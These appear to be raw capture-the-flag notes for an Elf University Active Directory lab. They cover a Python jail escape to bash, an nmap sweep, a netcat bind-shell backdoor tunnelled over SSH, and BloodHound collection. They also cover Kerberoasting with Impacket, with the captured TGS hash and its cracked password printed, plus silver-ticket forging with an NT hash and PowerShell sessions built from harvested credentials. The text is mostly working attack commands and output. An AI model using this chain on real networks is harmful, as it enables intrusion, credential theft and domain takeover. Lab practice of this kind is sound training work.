https://register.elfu.org/register

ssh unymizfbzq@grades.elfu.org -p 2222
Xtowpgqop@

# Grade program breakout
ctrl-d -> breaks out of IPython session

then use os module to execute shell

```python
===================================================
=      Elf University Student Grades Portal       =
=          (Reverts Everyday 12am EST)            =
===================================================
1. Print Current Courses/Grades.
e. Exit
: Traceback (most recent call last):
  File "/opt/grading_system", line 41, in <module>
    main()
  File "/opt/grading_system", line 26, in main
    a = input(": ").lower().strip()
EOFError
# __import__("os").system("/bin/bash")
>>> import os
>>> os.system("/bin/bash")
qeupltghai@grades:~$ 
```
# Network Scan
qeupltghai@grades:~$ route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
10.128.1.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
10.128.2.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
10.128.3.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0

3 IP spaces of interest `10.128.1-3.0/24`.

```bash
# Scan for hosts in those ranges listening on ports 22 or 45
nmap -PS22,45 -sC -sV -oA nmap/output.txt 10.128.1-3.0/24
```

# Tunneled Shell

Setup backdoor:
```bash
# run on remote server
nc -l -c "/bin/bash" -p 51234


setup tunnel
```bash
# run on local machine
ssh -L 51234:localhost:51234 USER@grades.elfu.org -p 2222
```

connect to backdoor
```bash
# run on local machine
nc localhost 51234
```

# BloodHound-python
Download source here
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1

```bash
# Set up listener on grades.elfu.org
nc -l -p 51234 > BH.zip
# Set up tunnel on local
ssh -L 51234:localhost:51234 USER@grades.elfu.org -p 2222
# Pipe script to remote host
cat *.zip | nc localhost 51234

unzip *.zip
cd BloodHound-python
pip install .

~/.local/bin/bloodhound-python -c All -u "`whoami`" -p '$PASSWORD' -d ELFU.local -ns 10.128.3.30

tar -czvf BH.db.tar.gz *.json

# use backdoors to get the tarball back to local machine

```

# Impacket

```bash
python3 impacket-master/build/scripts-3.8/GetUserSPNs.py -outputfile spns.txt -request -debug elfu.local/`whoami`:'Nhtymvbkb@'

cat spns.txt
```

```
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$f024802ee983789376ced36cf828bdf0$787fd4abeeb51f8457cff9e4e09fa5a03f22b89b2fc8ea4977c9e3c8dac7ecb1ee1b37f14d475b07ed70116d1b7e22b6956e39c4527d0d4933a1100aaa5cb1793f4da3d54a7201a9ba5b65d7b5c385fd6063dc68e3c8c18e9b37904dd75b616f6873cd1fd9bb9a5264364afaf2806678494840f4ced379f14151f4604dd961ec37f093887f7eaa038932250c81fded63faf80f8045d04bb3f57cb4117d42aa29dcacb97f4fe57d3e29d3abb4b0e1b9d40d6d70c89c5c6e6be3e297a4962403957994bd4e887d2edc4f1b7e2e34560451d309f859ed16ab17326da1208ec8b8a5a7e58e640a1e6f56e6405cebdf73e06579bdd656663be8fb5bf5ea0df77c3a782343854cf242d1552dc8e9cc8d2e70badc3f2f9ed6bd893f931143bf1c4c7d4f54eab1868d6fe719215b4191f5bc5f73b4ccbc450e217877664875e4138d63c0821ba239a3a25345539d99f9919d4c88d7515d2305ed6c6deb33522a73dac500059a7a3a32ec43ad0ea371ebf981be688cad9be1937f6e7487c22c1968aa45fed3e28700ee77ba850757a01e2942557e5f770648b84ea84ee4dcce58545ad7830b4be21cb7124ecd67fbc9444c661e3917f200914b52ac7fd5afc0b1c5bebfa881332a1fd0a05c90063bedcffa79c82e1bb969d29982d46a211dc5c80a453f2c59ed8ee470ad05ad298be4ff9f9c588f827b9efd487c20563f9ccd10bfc0b44831d40521361790d7336f77271027ce5bce17fb6cd629c65c1ca9cde6c4b07e86ff02b28e79eaf890f5a80d6bd854729da6aa32903bc144374eb97b13e5b0926f78b01bc7f1da7410e1d3622ea4e4604b46b2f50b793e19f2dd25cbb381433a151f3f6ccdf22dd97c7d362c477a9d95199603e2689d4946a2a3a2a40257f96cc79fcd9f172312726ac306dd30852b12b3e247a14658e41fc3fb733282d3680db7ffa5dfe4f266294f93ebdef1c66a81b6cbbbe0c499cac5b63323d523f92cd5d8a5a2cdaf18ebac4e4bd9effc31a005b091e1b2a0bbbcd64e6ea1575245b0b19e01866f63d730ce7beeeb56ae0c2d75a5f64853da1816c1e76432d47a5a87339386ddf679cfdf1310862695457a23469ff565561dc90c5f67e25ca7aa8a9b1477902893a1ee42f5c8159ab34aee2c86d590bc080c1fd6a9b2318fa24cfbd0f4a221ee4fc9b2e11eccfa9f923300bddd77c6cade78833e3fa5ad970f2b316502e6466484bd75ee9a7f4cbf803108dd1bfcaa1bc69de60a160f05af40b2a092ba799ab7b470ea746685629efb8887fec198a7020200ea5368b8b0c81d1d15346ac8a4df0cff8b411733f75505ee818db5344ce3a0c1f79740977286172bef9e7c74d04e08b10be7ff279ecfcc511117978b66a2ba19df9b3ec8e1168ce96a4948eef4847a9cfc4d8fb43509c5817973fd500a1d3f2176e4cee5f046db03db69e057ae923c1347

$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$f024802ee983789376ced36cf828bdf0$787fd4abeeb51f8457cff9e4e09fa5a03f22b89b2fc8ea4977c9e3c8dac7ecb1ee1b37f14d475b07ed70116d1b7e22b6956e39c4527d0d4933a1100aaa5cb1793f4da3d54a7201a9ba5b65d7b5c385fd6063dc68e3c8c18e9b37904dd75b616f6873cd1fd9bb9a5264364afaf2806678494840f4ced379f14151f4604dd961ec37f093887f7eaa038932250c81fded63faf80f8045d04bb3f57cb4117d42aa29dcacb97f4fe57d3e29d3abb4b0e1b9d40d6d70c89c5c6e6be3e297a4962403957994bd4e887d2edc4f1b7e2e34560451d309f859ed16ab17326da1208ec8b8a5a7e58e640a1e6f56e6405cebdf73e06579bdd656663be8fb5bf5ea0df77c3a782343854cf242d1552dc8e9cc8d2e70badc3f2f9ed6bd893f931143bf1c4c7d4f54eab1868d6fe719215b4191f5bc5f73b4ccbc450e217877664875e4138d63c0821ba239a3a25345539d99f9919d4c88d7515d2305ed6c6deb33522a73dac500059a7a3a32ec43ad0ea371ebf981be688cad9be1937f6e7487c22c1968aa45fed3e28700ee77ba850757a01e2942557e5f770648b84ea84ee4dcce58545ad7830b4be21cb7124ecd67fbc9444c661e3917f200914b52ac7fd5afc0b1c5bebfa881332a1fd0a05c90063bedcffa79c82e1bb969d29982d46a211dc5c80a453f2c59ed8ee470ad05ad298be4ff9f9c588f827b9efd487c20563f9ccd10bfc0b44831d40521361790d7336f77271027ce5bce17fb6cd629c65c1ca9cde6c4b07e86ff02b28e79eaf890f5a80d6bd854729da6aa32903bc144374eb97b13e5b0926f78b01bc7f1da7410e1d3622ea4e4604b46b2f50b793e19f2dd25cbb381433a151f3f6ccdf22dd97c7d362c477a9d95199603e2689d4946a2a3a2a40257f96cc79fcd9f172312726ac306dd30852b12b3e247a14658e41fc3fb733282d3680db7ffa5dfe4f266294f93ebdef1c66a81b6cbbbe0c499cac5b63323d523f92cd5d8a5a2cdaf18ebac4e4bd9effc31a005b091e1b2a0bbbcd64e6ea1575245b0b19e01866f63d730ce7beeeb56ae0c2d75a5f64853da1816c1e76432d47a5a87339386ddf679cfdf1310862695457a23469ff565561dc90c5f67e25ca7aa8a9b1477902893a1ee42f5c8159ab34aee2c86d590bc080c1fd6a9b2318fa24cfbd0f4a221ee4fc9b2e11eccfa9f923300bddd77c6cade78833e3fa5ad970f2b316502e6466484bd75ee9a7f4cbf803108dd1bfcaa1bc69de60a160f05af40b2a092ba799ab7b470ea746685629efb8887fec198a7020200ea5368b8b0c81d1d15346ac8a4df0cff8b411733f75505ee818db5344ce3a0c1f79740977286172bef9e7c74d04e08b10be7ff279ecfcc511117978b66a2ba19df9b3ec8e1168ce96a4948eef4847a9cfc4d8fb43509c5817973fd500a1d3f2176e4cee5f046db03db69e057ae923c1347:Snow2021!
```

# SMB Shares
```bash
jnjebpgcdp@grades:~/BloodHound.py-master$ smbclient -U jnjebpgcdp -L 10.128.3.30
Enter WORKGROUP\jnjebpgcdp's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      
        sysvol          Disk      
        elfu_svc_shr    Disk      elfu_svc_shr
        research_dep    Disk      research_dep
        IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available
```
```
netname: netlogon
        remark:
        path:   C:\var\lib\samba\sysvol\elfu.local\scripts
        password:
netname: sysvol
        remark:
        path:   C:\var\lib\samba\sysvol
        password:
netname: elfu_svc_shr
        remark: elfu_svc_shr
        path:   C:\elfu_svc_shr
        password:
netname: research_dep
        remark: research_dep
        path:   C:\research_dep
        password:

python3 impacket-master/build/scripts-3.8/getPac.py -targetUser elfu_svc -debug elfu.local/`whoami`:"Nhtymvbkb@" > elfu_svc.pac

ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon                   Delegation 
-----------------------------------  --------  --------  --------------------------  --------------------------  ----------
ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 04:30:39.044698             
ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 04:30:39.044698             
ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 04:30:39.044698             
ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  2021-12-30 04:30:39.044698 

```
> SID
rpcclient $> lookupnames jnjebpgcdp
jnjebpgcdp S-1-5-21-2037236562-2033616742-1485113978-1589 (User: 1)

rpcclient $> lookupnames elfu_svc
elfu_svc S-1-5-21-2037236562-2033616742-1485113978-1105 (User: 1)

> forged TGS for elfu_svc
 python3 impacket-master/build/scripts-3.8/ticketer.py -debug -domain elfu.local -spn elfu_svc/elfu.local -domain-sid S-1-5-21-2037236562-2033616742-1485113978 -nthash 2F4D54FC98CF6984B25A57F676065E70 `whoami`

 https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#silver-ticket
 > NTLM hash calc
 python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "Snow2021!".encode("utf-16le")).digest()))'

smbclient //10.128.3.30/elfu_svc_shr -U elfu_svc

unymizfbzq@grades:~/elfu_svc_shr$ vim GetProcessInfo.ps1 
unymizfbzq@grades:~/elfu_svc_shr$ powershell GetProcessInfo.ps1 
A1d655f7f5d98b10!

UserName                                  Password
--------                                  --------
elfu.local\remote_elf System.Security.SecureString


$SecPassword = ConvertTo-SecureString 'A1d655f7f5d98b10!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('elfu.local\remote_elf', $SecPassword)
$session = New-PSSession -ComputerName DC01.ELFU.LOCAL -Credential $Cred

$SecPassword = ConvertTo-SecureString 'Xtowpgqop@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('elfu.local\unymizfbzq', $SecPassword)
$session = New-PSSession -ComputerName DC01.ELFU.LOCAL -Credential $Cred
# References
https://www.stationx.net/nmap-cheat-sheet/
https://www.everythingcli.org/ssh-tunnelling-for-fun-and-profit-local-vs-remote/
https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf
https://github.com/ropnop/kerbrute
https://www.youtube.com/watch?v=FbTxPz_GA4o&t=624s
https://bloodhound.readthedocs.io/en/latest/data-collection/bloodhound-py.html
